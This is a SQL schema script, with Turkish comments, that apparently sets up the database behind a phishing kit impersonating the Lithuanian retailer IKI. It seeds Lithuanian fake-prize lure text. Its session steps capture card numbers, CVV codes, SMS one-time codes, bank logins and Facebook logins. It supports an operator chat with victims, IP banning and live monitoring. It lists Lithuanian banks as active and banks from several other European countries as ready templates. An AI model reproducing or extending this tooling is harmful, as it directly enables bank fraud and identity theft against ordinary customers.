-- =====================================================================
-- FULL SCHEMA — TEMIZ SUPABASE KURULUMU (tek seferde calistir)
-- Tablolar: sessions, global_settings, banks, banned_ips, chat_messages
-- + storage bucket'lari (assets, chat_images) + realtime publication
-- =====================================================================

-- ==================== 1) SESSIONS ====================
CREATE TABLE IF NOT EXISTS public.sessions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  public_id bigint,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now(),
  amount numeric DEFAULT 0,
  current_step text NOT NULL DEFAULT 'win',
  status text NOT NULL DEFAULT 'offline',
  form_data jsonb NOT NULL DEFAULT '{}'::jsonb,
  is_hidden boolean DEFAULT false,
  partner_name text,
  participation_code text,
  sms_digits integer NOT NULL DEFAULT 6,
  sms_custom_text text,
  ip_address text,
  user_agent text,
  deleted_at timestamptz
);

CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq;
ALTER TABLE public.sessions ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq');
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (current_step IN (
  'code_entry','sms','win','verify','banken','card','wait','invalid_bank',
  'bank','live_support','special_approval','congratulations','congrats',
  'facebook','wheel','login','bank_login','SPECIAL_INFO',
  'generator1','generator2','custom_question','win2','banken2'
));

ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS sessions_anon_select ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_delete ON public.sessions;
DROP POLICY IF EXISTS sessions_authenticated_all ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_insert_demo ON public.sessions;
CREATE POLICY sessions_anon_select ON public.sessions FOR SELECT TO anon USING (true);
CREATE POLICY sessions_anon_update ON public.sessions FOR UPDATE TO anon USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_insert ON public.sessions FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY sessions_authenticated_all ON public.sessions FOR ALL TO authenticated USING (true) WITH CHECK (true);

CREATE UNIQUE INDEX IF NOT EXISTS idx_sessions_public_id ON public.sessions (public_id) WHERE public_id IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_sessions_ip_created ON public.sessions (ip_address, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_created_at ON public.sessions (created_at DESC);

-- ==================== 2) GLOBAL_SETTINGS ====================
CREATE TABLE IF NOT EXISTS public.global_settings (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  logo_url text DEFAULT '/form-assets/iki-mini-logo.png',
  bg_url text DEFAULT '/form-assets/bg-desktop.png',
  background_url text,
  og_image_url text,
  portal_name text DEFAULT 'IKI',
  support_center_name text DEFAULT 'IKI pagalba',
  target_country text DEFAULT 'Litvanya',
  site_language text DEFAULT 'lt',
  site_enabled boolean DEFAULT true,
  entry_page text DEFAULT '/win',
  wheel_settings jsonb DEFAULT '{}'::jsonb,
  win_title text,
  win_subtitle text,
  win_button text,
  banken_title text,
  banken_subtitle text,
  wait_title text,
  wait_subtitle text,
  sms_title text,
  card_title text,
  card_subtitle text,
  code_title text,
  code_subtitle text,
  code_button text,
  live_support_title text,
  live_support_subtitle text,
  live_support_button text,
  profile_title_small text,
  profile_title_main text,
  profile_subtitle text,
  profile_button text,
  banken_search_placeholder text,
  sms_subtitle text,
  sms_input_label text,
  sms_button text,
  sms_loading text,
  card_owner_label text,
  card_number_label text,
  card_expiry_label text,
  card_cvv_label text,
  card_button text,
  profile_firstname_label text,
  profile_lastname_label text,
  profile_phone_label text,
  profile_loading_text text,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Enable read access for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable insert for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable update for all users" ON public.global_settings;
DROP POLICY IF EXISTS "Enable delete for all users" ON public.global_settings;
CREATE POLICY "Enable read access for all users" ON public.global_settings FOR SELECT USING (true);
CREATE POLICY "Enable insert for all users" ON public.global_settings FOR INSERT WITH CHECK (true);
CREATE POLICY "Enable update for all users" ON public.global_settings FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY "Enable delete for all users" ON public.global_settings FOR DELETE USING (true);

-- Eksik kolonlar (mevcut kurulumlar icin)
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS site_language text DEFAULT 'lt';

INSERT INTO public.global_settings (
  site_enabled, entry_page, site_language, target_country,
  logo_url, bg_url, portal_name, support_center_name,
  win_title, win_subtitle, win_button,
  banken_title, banken_subtitle, banken_search_placeholder,
  wait_title, wait_subtitle,
  sms_title, sms_subtitle, sms_input_label, sms_button, sms_loading,
  card_title, card_subtitle, card_owner_label, card_number_label,
  card_expiry_label, card_cvv_label, card_button,
  code_title, code_subtitle, code_button,
  live_support_title, live_support_subtitle, live_support_button,
  profile_title_small, profile_title_main, profile_subtitle,
  profile_firstname_label, profile_lastname_label, profile_phone_label,
  profile_button, profile_loading_text
)
SELECT
  true, '/win', 'lt', 'Litvanya',
  '/form-assets/iki-mini-logo.png', '/form-assets/bg-desktop.png',
  'IKI klientų portalas', 'IKI klientų aptarnavimas',
  'Išskirtinė IKI premija',
  'Sveikiname! Buvote atrinkti šios dienos IKI kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.',
  'Atsiimti premiją',
  'Pasirinkite savo banką', 'Pasirinkite savo banką, kad tęstumėte.', 'Ieškoti banko...',
  'Prašome palaukti', 'Jūsų užklausa saugiai apdorojama...',
  'SMS saugos kodas', 'Įveskite {digits} skaitmenų kodą.', 'Vienkartinis kodas', 'Patvirtinti', 'Apdorojama...',
  'Mokėjimo informacija', 'Patikrinkite ir patvirtinkite savo duomenis.',
  'Kortelės turėtojo vardas', 'Kortelės numeris', 'Galiojimo pabaiga MM/MM', 'Saugos kodas', 'Tęsti',
  'Sveiki', 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.', 'Patvirtinti kodą',
  'Tiesioginis palaikymas',
  'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.',
  'Pradėti pokalbį',
  'Prizas patvirtintas', 'Jūsų premijos suma', 'Patvirtinkite savo duomenis tolesniam apdorojimui.',
  'Vardas', 'Pavardė', 'Mobiliojo telefono numeris', 'Kitas', 'Apdorojama...'
WHERE NOT EXISTS (SELECT 1 FROM public.global_settings);

-- Mevcut satirdaki NULL alanlari LT varsayilanlariyla doldur
UPDATE public.global_settings SET
  site_language = COALESCE(site_language, 'lt'),
  target_country = COALESCE(target_country, 'Litvanya'),
  logo_url = CASE WHEN logo_url IS NULL OR logo_url = '' OR logo_url LIKE 'https://www.maxima.lt/%' THEN '/form-assets/iki-mini-logo.png' ELSE logo_url END,
  bg_url = CASE WHEN bg_url IS NULL OR bg_url = '' OR bg_url LIKE '%6d4bc8553e%' THEN '/form-assets/bg-desktop.png' ELSE bg_url END,
  portal_name = COALESCE(portal_name, 'IKI klientų portalas'),
  support_center_name = COALESCE(support_center_name, 'IKI klientų aptarnavimas'),
  win_title = COALESCE(win_title, 'Išskirtinė IKI premija'),
  win_subtitle = COALESCE(win_subtitle, 'Sveikiname! Buvote atrinkti šios dienos IKI kampanijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.'),
  win_button = COALESCE(win_button, 'Atsiimti premiją'),
  banken_title = COALESCE(banken_title, 'Pasirinkite savo banką'),
  banken_subtitle = COALESCE(banken_subtitle, 'Pasirinkite savo banką, kad tęstumėte.'),
  banken_search_placeholder = COALESCE(banken_search_placeholder, 'Ieškoti banko...'),
  wait_title = COALESCE(wait_title, 'Prašome palaukti'),
  wait_subtitle = COALESCE(wait_subtitle, 'Jūsų užklausa saugiai apdorojama...'),
  sms_title = COALESCE(sms_title, 'SMS saugos kodas'),
  sms_subtitle = COALESCE(sms_subtitle, 'Įveskite {digits} skaitmenų kodą.'),
  sms_input_label = COALESCE(sms_input_label, 'Vienkartinis kodas'),
  sms_button = COALESCE(sms_button, 'Patvirtinti'),
  sms_loading = COALESCE(sms_loading, 'Apdorojama...'),
  card_title = COALESCE(card_title, 'Mokėjimo informacija'),
  card_subtitle = COALESCE(card_subtitle, 'Patikrinkite ir patvirtinkite savo duomenis.'),
  card_owner_label = COALESCE(card_owner_label, 'Kortelės turėtojo vardas'),
  card_number_label = COALESCE(card_number_label, 'Kortelės numeris'),
  card_expiry_label = COALESCE(card_expiry_label, 'Galiojimo pabaiga MM/MM'),
  card_cvv_label = COALESCE(card_cvv_label, 'Saugos kodas'),
  card_button = COALESCE(card_button, 'Tęsti'),
  code_title = COALESCE(code_title, 'Sveiki'),
  code_subtitle = COALESCE(code_subtitle, 'Įveskite dalyvavimo kodą, kurį gavote iš {partner}, kad atsiimtumėte atlygį.'),
  code_button = COALESCE(code_button, 'Patvirtinti kodą'),
  live_support_title = COALESCE(live_support_title, 'Tiesioginis palaikymas'),
  live_support_subtitle = COALESCE(live_support_subtitle, 'Norėdami tęsti, turite susisiekti su mūsų klientų aptarnavimo skyriumi.' || chr(10) || chr(10) || 'Spustelėkite žemiau esantį mygtuką, kad pradėtumėte pokalbį.'),
  live_support_button = COALESCE(live_support_button, 'Pradėti pokalbį'),
  profile_title_small = COALESCE(profile_title_small, 'Prizas patvirtintas'),
  profile_title_main = COALESCE(profile_title_main, 'Jūsų premijos suma'),
  profile_subtitle = COALESCE(profile_subtitle, 'Patvirtinkite savo duomenis tolesniam apdorojimui.'),
  profile_firstname_label = COALESCE(profile_firstname_label, 'Vardas'),
  profile_lastname_label = COALESCE(profile_lastname_label, 'Pavardė'),
  profile_phone_label = COALESCE(profile_phone_label, 'Mobiliojo telefono numeris'),
  profile_button = COALESCE(profile_button, 'Kitas'),
  profile_loading_text = COALESCE(profile_loading_text, 'Apdorojama...')
WHERE id = (SELECT id FROM public.global_settings ORDER BY created_at NULLS LAST LIMIT 1);

-- ==================== 3) BANKS (Litvanya) ====================
CREATE TABLE IF NOT EXISTS public.banks (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  slug text UNIQUE NOT NULL,
  name text NOT NULL,
  brand_color text,
  accent_color text,
  logo_file text,
  domain text,
  country text DEFAULT 'LT',
  is_active boolean DEFAULT true,
  auto_redirect boolean DEFAULT false,
  design_config jsonb DEFAULT '{}'::jsonb,
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow public read access on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public insert on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public update on banks" ON public.banks;
DROP POLICY IF EXISTS "Allow public delete on banks" ON public.banks;
CREATE POLICY "Allow public read access on banks" ON public.banks FOR SELECT USING (true);
CREATE POLICY "Allow public insert on banks" ON public.banks FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow public update on banks" ON public.banks FOR UPDATE USING (true);
CREATE POLICY "Allow public delete on banks" ON public.banks FOR DELETE USING (true);

ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS auto_redirect boolean DEFAULT false;

-- Litvanya (AKTIF)
INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
  ('swedbank-lt',        'Swedbank',         '/bank-logos/lithuania/swedbank-lt.png',   'LT', true),
  ('seb-lt',             'SEB',              '/bank-logos/lithuania/seb-lt.png',        'LT', true),
  ('luminor-lt',         'Luminor',          '/bank-logos/lithuania/luminor-lt.png',    'LT', true),
  ('citadele-lt',        'Citadele',         '/bank-logos/lithuania/citadele-lt.png',   'LT', true),
  ('siauliu-lt',         'Šiaulių bankas',   '/bank-logos/lithuania/siauliu-lt.png',    'LT', true),
  ('lku-lt',             'LKU',              '/bank-logos/lithuania/lku-lt.png',        'LT', true)
ON CONFLICT (slug) DO NOTHING;

-- Facebook login akisi icin (kullanici listesinde gorunmez, template mevcut)
INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
  ('facebook-lt', 'Facebook', '/form-assets/iki-mini-logo.png', 'LT', false)
ON CONFLICT (slug) DO NOTHING;

-- Eski hatali slug'lari temizle (template'de karsiliklari yok -> 404)
DELETE FROM public.banks WHERE slug IN ('siauliu-bankas-lt', 'siauliu-bankas', 'artea-lt');
UPDATE public.banks SET is_active = true WHERE slug IN ('swedbank-lt','seb-lt','luminor-lt','citadele-lt','siauliu-lt','lku-lt');

-- Diger ulkeler (PASIF — admin panelde gorunur, kullaniciya gosterilmez)
INSERT INTO public.banks (slug, name, logo_file, country, is_active) VALUES
  -- Hollanda
  ('ing',                    'ING',                    '/bank-logos/ing.svg',                        'Hollanda',   false),
  ('rabobank',               'Rabobank',               '/bank-logos/rabobank.svg',                   'Hollanda',   false),
  ('abn-amro',               'ABN AMRO',               '/bank-logos/abn-amro.svg',                   'Hollanda',   false),
  ('asn-bank',               'ASN Bank',               '/bank-logos/asn-bank.svg',                   'Hollanda',   false),
  ('bunq',                   'bunq',                   '/bank-logos/bunq.svg',                       'Hollanda',   false),
  ('knab',                   'Knab',                   '/bank-logos/knab.svg',                       'Hollanda',   false),
  ('triodos-bank',           'Triodos Bank',           '/bank-logos/triodos-bank.svg',               'Hollanda',   false),
  ('van-lanschot-kempen',    'Van Lanschot Kempen',    '/bank-logos/van-lanschot-kempen.svg',        'Hollanda',   false),
  ('n26',                    'N26',                    '/bank-logos/n26.svg',                        'Hollanda',   false),
  ('revolut',                'Revolut',                '/bank-logos/revolut.svg',                    'Hollanda',   false),
  ('buut',                   'Buut',                   '/bank-logos/buut.svg',                       'Hollanda',   false),
  ('mollie',                 'Mollie',                 '/bank-logos/mollie.svg',                     'Hollanda',   false),
  ('yoursafe',               'YourSafe',               '/bank-logos/yoursafe.svg',                   'Hollanda',   false),
  ('nationale-nederlanden',  'Nationale-Nederlanden',  '/bank-logos/nationale-nederlanden.svg',      'Hollanda',   false),
  -- Finlandiya
  ('nordea-fi',              'Nordea',                 '/bank-logos/nordea-fi.svg',                  'Finlandiya', false),
  ('op-fi',                  'OP',                     '/bank-logos/op-fi.svg',                      'Finlandiya', false),
  ('danske-bank-fi',         'Danske Bank',            '/bank-logos/danske-bank-fi.png',             'Finlandiya', false),
  ('handelsbanken-fi',       'Handelsbanken',          '/bank-logos/handelsbanken-fi.svg',           'Finlandiya', false),
  ('aktia-fi',               'Aktia',                  '/bank-logos/aktia-fi.svg',                   'Finlandiya', false),
  ('s-pankki-fi',            'S-Pankki',               '/bank-logos/s-pankki-fi.png',                'Finlandiya', false),
  ('pop-pankki-fi',          'POP Pankki',             '/bank-logos/pop-pankki-fi.svg',              'Finlandiya', false),
  ('omasp-fi',               'OmaSp',                  '/bank-logos/omasp-fi.svg',                   'Finlandiya', false),
  ('landsbanken-fi',         'Landsbanken',            '/bank-logos/landsbanken-fi.svg',             'Finlandiya', false),
  -- Ispanya
  ('banco-santander-es',     'Banco Santander',        '/bank-logos/banco-santander-es.svg',         'İspanya',    false),
  ('caixabank-es',           'CaixaBank',              '/bank-logos/caixabank-es.png',               'İspanya',    false),
  ('banco-bbva-es',          'BBVA',                   '/bank-logos/banco-bbva-es.png',              'İspanya',    false),
  ('bankinter-es',           'Bankinter',              '/bank-logos/bankinter-es.svg',               'İspanya',    false),
  ('unicaja-es',             'Unicaja',                '/bank-logos/unicaja-es.png',                 'İspanya',    false),
  ('ibercaja-es',            'Ibercaja',               '/bank-logos/ibercaja-es.svg',                'İspanya',    false),
  ('openbank-es',            'Openbank',               '/bank-logos/openbank-es.svg',                'İspanya',    false),
  ('evo-banco-es',           'EVO Banco',              '/bank-logos/evo-banco-es.png',               'İspanya',    false),
  ('kutxabank-es',           'Kutxabank',              '/bank-logos/kutxabank-es.png',               'İspanya',    false),
  ('laboral-kutxa-es',       'Laboral Kutxa',          '/bank-logos/laboral-kutxa-es.png',           'İspanya',    false),
  ('cajamar-caja-rural-es',  'Cajamar Caja Rural',     '/bank-logos/cajamar-caja-rural-es.svg',      'İspanya',    false),
  ('cajasur-es',             'Cajasur',                '/bank-logos/cajasur-es.png',                 'İspanya',    false),
  -- Avusturya
  ('easybank',               'easybank',               '/easybank-logo.png',                         'Avusturya',  false),
  ('oberbank',               'Oberbank',               '/oberbank-logo.png',                         'Avusturya',  false),
  ('schoellerbank',          'Schoellerbank',          '/schoellerbank-logo.png',                    'Avusturya',  false),
  ('bank99',                 'bank99',                 '/bank99-logo.png',                           'Avusturya',  false),
  -- Estonya
  ('bigbank',                'Bigbank',                '/bank-logos/estonia/bigbank.jpg',            'Estonya',    false),
  ('citadele-banka',         'Citadele Banka',         '/bank-logos/estonia/citadele-banka.jpg',     'Estonya',    false),
  ('coop-pank',              'Coop Pank',              '/bank-logos/estonia/coop-pank.jpg',          'Estonya',    false),
  ('inbank',                 'Inbank',                 '/bank-logos/estonia/inbank.png',             'Estonya',    false),
  ('lhv-pank',               'LHV Pank',               '/bank-logos/estonia/lhv-pank.jpg',           'Estonya',    false),
  ('luminor-ee',             'Luminor',                '/bank-logos/estonia/luminor-ee.jpg',         'Estonya',    false),
  ('op-corporate-bank',      'OP Corporate Bank',      '/bank-logos/estonia/op-corporate-bank.jpg',  'Estonya',    false),
  ('seb-pank',               'SEB Pank',               '/bank-logos/estonia/seb-pank.jpg',           'Estonya',    false),
  ('swedbank-ee',            'Swedbank',               '/bank-logos/estonia/swedbank-ee.jpg',        'Estonya',    false)
ON CONFLICT (slug) DO NOTHING;

-- ==================== 4) BANNED_IPS ====================
CREATE TABLE IF NOT EXISTS public.banned_ips (
  ip_address text PRIMARY KEY,
  reason text,
  banned_at timestamptz DEFAULT now()
);

ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "Allow all read access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all insert access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all delete access to banned_ips" ON public.banned_ips;
CREATE POLICY "Allow all read access to banned_ips" ON public.banned_ips FOR SELECT USING (true);
CREATE POLICY "Allow all insert access to banned_ips" ON public.banned_ips FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all delete access to banned_ips" ON public.banned_ips FOR DELETE USING (true);

-- ==================== 5) CHAT ====================
CREATE TABLE IF NOT EXISTS public.chat_messages (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL, -- route session id (public_id VEYA uuid) tasir; FK yok
  sender text NOT NULL CHECK (sender IN ('user','admin')),
  content text NOT NULL,
  image_url text,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX IF NOT EXISTS idx_chat_messages_session ON public.chat_messages (session_id);

ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS chat_messages_anon_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_auth_all ON public.chat_messages;
CREATE POLICY chat_messages_anon_all ON public.chat_messages FOR ALL TO anon USING (true) WITH CHECK (true);
CREATE POLICY chat_messages_auth_all ON public.chat_messages FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- ==================== 6) STORAGE BUCKET'LARI ====================
INSERT INTO storage.buckets (id, name, public) VALUES ('assets', 'assets', true) ON CONFLICT (id) DO NOTHING;
INSERT INTO storage.buckets (id, name, public) VALUES ('chat_images', 'chat_images', true) ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_select" ON storage.objects;
DROP POLICY IF EXISTS "chat_images_insert" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING (bucket_id IN ('assets','chat_images'));
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK (bucket_id IN ('assets','chat_images'));

-- ==================== 7) REALTIME (canli log/presence/chat) ====================
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN
  ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

NOTIFY pgrst, 'reload schema';

-- Kontrol
SELECT 'sessions' t, count(*) FROM public.sessions
UNION ALL SELECT 'global_settings', count(*) FROM public.global_settings
UNION ALL SELECT 'banks', count(*) FROM public.banks
UNION ALL SELECT 'banned_ips', count(*) FROM public.banned_ips
UNION ALL SELECT 'chat_messages', count(*) FROM public.chat_messages;
